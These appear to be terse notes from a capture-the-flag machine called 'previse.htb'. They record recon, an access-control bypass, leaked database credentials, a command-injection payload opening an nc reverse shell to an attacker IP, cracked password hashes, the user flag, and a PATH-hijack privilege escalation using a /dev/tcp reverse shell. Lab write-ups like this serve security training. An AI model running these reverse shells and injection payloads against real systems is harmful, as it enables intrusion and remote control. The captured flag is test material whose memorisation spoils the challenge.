10.10.11.104

# NMAP
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
- Apache 2.4.29 may have searchsploit 46676?
- HTTP Login, POST parameters username=""&password=""
- Nikto, Hydra, SQLi?

# GOBUSTER
/css
/js

/login.php
- SQLMAP:
``` 
sqlmap -u 'http://previse.htb/login.php?username=admin&password=pw' -p username,password --method=POST
```
- username and password parameters don't appear to be injectible.

/config.php
- 200 OK but no content?

/nav.php
- Can create account (accounts.php)
- Can edit response from 302 to 200  
- cyberswell:cyberswell


sitebackup.zip
- config.php
	- root:mySQL_p@ssw0rd!:) for "previse" db

file_logs.php
- Command injection
- delim=comma%26nc+-e+/bin/sh+10.10.15.14+1337

Upgraded to meterpreter shell with /post/multi/manage/shell_to_meterpreter

mysql -u root -p mySQL_p@ssw0rd!:)

select * from accounts;
+----+------------+------------------------------------+---------------------+
| id | username   | password                           | created_at          |
+----+------------+------------------------------------+---------------------+
|  1 | m4lwhere   | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | admin      | $1$🧂llol$V/xv0wMqNEVaOf.LoAuZB1 | 2021-09-14 07:03:17 |
|  3 | goadmin    | $1$🧂llol$uXqzPW6SXUONt.AIOBqLy. | 2021-09-14 09:37:22 |
|  4 | cyberswell | $1$🧂llol$KGKVEGMtCXcCubG57kxGe1 | 2021-09-14 16:47:42 |
+----+------------+------------------------------------+---------------------+

$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
$1$🧂llol$V/xv0wMqNEVaOf.LoAuZB1:12345678
$1$🧂llol$uXqzPW6SXUONt.AIOBqLy.:admin

su m4lwhere:ilovecody112235!

user.txt:
eac9a2f7d7ca25e70b3bdebcedf1dd7a

checking sudo -l
- /opt/scripts/access_backup.sh?
	- Can make executible called "gzip" in /tmp and make /tmp part of $PATH

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.10/1337 0>&1
```

export PATH=/tmp:$PATH

sudo /opt/scripts/access_backup.sh

Bam root

